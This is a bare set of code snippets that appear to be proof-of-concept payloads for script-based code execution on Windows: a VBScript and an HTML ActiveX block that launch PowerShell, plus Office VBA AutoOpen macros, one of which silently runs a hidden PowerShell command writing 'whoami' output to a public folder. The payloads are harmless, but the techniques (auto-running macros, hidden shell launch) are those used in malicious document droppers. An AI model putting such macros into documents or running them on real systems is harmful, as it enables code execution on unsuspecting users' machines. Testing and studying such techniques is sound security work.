Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe", 1, false

<script>
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("powershell.exe");
</script>



Sub AutoOpen()
    MsgBox "Macros are enabled"
End Sub


Sub AutoOpen()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -WindowStyle Hidden -Command whoami > C:\Users\Public\whoami.txt"
End Sub
